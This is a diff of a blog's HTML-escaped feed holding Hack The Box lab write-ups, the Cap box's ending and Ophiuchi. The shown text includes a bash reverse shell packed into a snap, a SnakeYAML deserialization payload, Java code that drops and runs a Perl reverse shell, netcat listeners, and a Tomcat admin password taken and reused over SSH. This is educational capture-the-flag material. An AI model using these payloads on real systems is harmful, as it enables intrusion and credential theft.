+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;pingme/meta/snap.yaml
+name: pingme
+version: &lt;span class=&quot;s1&quot;&gt;&apos;0.1&apos;&lt;/span&gt;
+app:
+    pingme:
+        &lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;: /usr/bin/ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.14.204
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And building a snap installer with:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;snapcraft pack pingme
+...
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;snap &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;pingme.snap &lt;span class=&quot;nt&quot;&gt;--devmode&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Which, once I installed the plugin I did successfully receive pings back to me&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;tcpdump &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; tun0 icmp
+tcpdump: verbose output suppressed, use &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;v]... &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;full protocol decode
+listening on tun0, link-type RAW &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Raw IP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, snapshot length 262144 bytes
+00:45:51.901719 IP 10.10.14.1 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 10.10.14.204: ICMP host 10.10.10.233 unreachable, length 204
+00:45:56.411439 IP 10.10.14.1 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 10.10.14.204: ICMP host 10.10.10.233 unreachable, length 204
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;However, when I moved on to attempting to set up a reverse shell:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;rshell/meta/snap.yaml
+name: rshell
+version: &lt;span class=&quot;s1&quot;&gt;&apos;0.1&apos;&lt;/span&gt;
+app:
+    rshell:
+        &lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;: /bin/bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/10.10.14.204/9000 0&amp;gt;&amp;amp;1
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;snapcraft pack rshell
+...
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;snap &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;rshell.snap &lt;span class=&quot;nt&quot;&gt;--devmode&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I never received a reverse shell back to myself, so I’m not certain if I crafted the snap package correctly, but I suspect that there’s a way to craft your own snap payload without using the pre-build one from the repository that I used previously.&lt;/p&gt;</content><author><name>Alex Loney</name></author><category term="blog" /><category term="writeup" /><category term="htb" /><category term="htb" /><category term="htb easy" /><category term="offsec" /><summary type="html">There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!</summary></entry><entry><title type="html">HTB: Spectra Writeup</title><link href="/blog/writeup/htb/htb-spectra/" rel="alternate" type="text/html" title="HTB: Spectra Writeup" /><published>2021-06-08T12:22:00-07:00</published><updated>2021-06-08T12:22:00-07:00</updated><id>/blog/writeup/htb/htb-spectra</id><content type="html" xml:base="/blog/writeup/htb/htb-spectra/">&lt;p&gt;There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!&lt;/p&gt;
 
 &lt;hr /&gt;
 
@@ -345,7 +1304,355 @@ end script
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 9001
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;We successfully become root!&lt;/p&gt;</content><author><name>Alex Loney</name></author><category term="blog" /><category term="writeup" /><category term="htb" /><category term="htb" /><category term="htb easy" /><category term="offsec" /><summary type="html">There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!</summary></entry><entry><title type="html">New Blog Who Dis</title><link href="/blog/new-blog-who-dis/" rel="alternate" type="text/html" title="New Blog Who Dis" /><published>2021-06-07T15:15:00-07:00</published><updated>2021-06-07T15:15:00-07:00</updated><id>/blog/new-blog-who-dis</id><content type="html" xml:base="/blog/new-blog-who-dis/">&lt;p&gt;I’d like to welcome you to my blog!!&lt;/p&gt;
+&lt;p&gt;We successfully become root!&lt;/p&gt;</content><author><name>Alex Loney</name></author><category term="blog" /><category term="writeup" /><category term="htb" /><category term="htb" /><category term="htb easy" /><category term="offsec" /><summary type="html">There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!</summary></entry><entry><title type="html">HTB: Ophiuchi Writeup</title><link href="/blog/writeup/htb/htb-ophiuchi/" rel="alternate" type="text/html" title="HTB: Ophiuchi Writeup" /><published>2021-06-07T23:15:00-07:00</published><updated>2021-06-07T23:15:00-07:00</updated><id>/blog/writeup/htb/htb-ophiuchi</id><content type="html" xml:base="/blog/writeup/htb/htb-ophiuchi/">&lt;p&gt;There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h1&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; nmap -sC -sV -oA nmap/ophiuchi 10.10.10.227
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-11 15:39 EDT
+Nmap scan report for 10.10.10.227
+Host is up (0.078s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee (RSA)
+|   256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab (ECDSA)
+|_  256 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 (ED25519)
+8080/tcp open  http    Apache Tomcat 9.0.38
+|_http-title: Parse YAML
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.84 seconds
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Port 8080 is running a tomcat server with a YAML parser, but when you use it, you receive:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Due to security reason this feature has been temporarily on hold. We will soon fix the issue!
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;However, it turns out that it’s actually performing the deserialization and simply not displaying the result&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; curl -i -X POST -d &apos;data=!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;http://10.10.14.204/test&quot;]]]]&apos; http://10.10.10.227:8080/yaml/Servlet
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After a bit of research, I located &lt;a href=&quot;&quot;&gt;this repository&lt;/a&gt; which has a decent example of a serialization attack. Cloning the repository and creating the following setup:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;tree
+&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+├── README.md
+├── src
+│   ├── artsploit
+│   │   ├── AwesomeScriptEngineFactory.class
+│   │   └── AwesomeScriptEngineFactory.java
+│   └── META-INF
+│       └── services
+│           └── javax.script.ScriptEngineFactory
+└── yaml-payload.jar
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I was able to craft the following Java code to execute a Perl reverse shell&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;artsploit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;javax.script.ScriptEngine&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;javax.script.ScriptEngineFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.io.IOException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.util.List&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.net.*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.io.*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.util.concurrent.*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;AwesomeScriptEngineFactory&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;implements&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ScriptEngineFactory&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+
+    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;AwesomeScriptEngineFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;nc&quot;&gt;BufferedWriter&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;writer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;BufferedWriter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;FileWriter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/tmp/rshell82.pl&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;writer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;use Socket;$i=\&quot;10.10.14.204\&quot;;$p=82;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\&quot;tcp\&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\&quot;&amp;gt;&amp;amp;S\&quot;);open(STDOUT,\&quot;&amp;gt;&amp;amp;S\&quot;);open(STDERR,\&quot;&amp;gt;&amp;amp;S\&quot;);exec(\&quot;/bin/sh -i\&quot;);};&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;writer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+
+            &lt;span class=&quot;nc&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;perl /tmp/rshell82.pl&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;printStackTrace&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getEngineName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getEngineVersion&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;List&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getExtensions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;List&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getMimeTypes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;List&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getNames&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getLanguageName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getLanguageVersion&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getParameter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getMethodCallSyntax&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getOutputStatement&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;toDisplay&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getProgram&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;statements&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ScriptEngine&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getScriptEngine&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;To execute this, I had to host an HTTP server:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 81
+Serving HTTP on 0.0.0.0 port 81 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://0.0.0.0:81/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
+10.10.10.227 - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12/Jun/2021 00:42:32] &lt;span class=&quot;s2&quot;&gt;&quot;HEAD /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1&quot;&lt;/span&gt; 200 -
+10.10.10.227 - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12/Jun/2021 00:42:32] &lt;span class=&quot;s2&quot;&gt;&quot;GET /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1&quot;&lt;/span&gt; 200 -
+10.10.10.227 - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;12/Jun/2021 00:42:33] &lt;span class=&quot;s2&quot;&gt;&quot;GET /artsploit/AwesomeScriptEngineFactory.class HTTP/1.1&quot;&lt;/span&gt; 200 -
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And catch the reverse shell&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;rlwrap nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 82
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 82 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.204] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.227] 36388
+/bin/sh: 0: can&lt;span class=&quot;s1&quot;&gt;&apos;t access tty; job control turned off
+$ whoami
+tomcat
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Success! We now have a working shell!!&lt;/p&gt;
+
+&lt;p&gt;Since this is a tomcat instance, the first thing I checked was &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;conf/tomcat-users.xml&lt;/code&gt; for the password&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;user username=&quot;admin&quot; password=&quot;whythereisalimit&quot; roles=&quot;manager-gui,admin-gui&quot;/&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Checking that via SSH, we have successful login with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin:whythereisalimit&lt;/code&gt;!!&lt;/p&gt;
+
